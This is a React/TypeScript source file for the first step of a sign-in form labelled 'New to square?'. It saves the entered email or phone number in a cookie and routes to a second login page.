import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function Login() {
  const [formInput, setFormInput] = useState<{username:string}>({username:""})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
   
    cookies.set("username", formInput.username)
    setIsLoading(false)
    navigate("../login/2")
    
}
  return (
    <div className="middle-form">
      <div className="submitForm">
       
       <h3>Sign in</h3>
       <p>New to square? <span className="nav2"> <a href="">Sign up</a></span></p>
        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
           
            <input minLength={6}  placeholder="Email or phone" onChange={handleInputChange} required id="username" name="username" type="text" />
          </div>
          

          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
     
      </div>
      </div>
  );
}
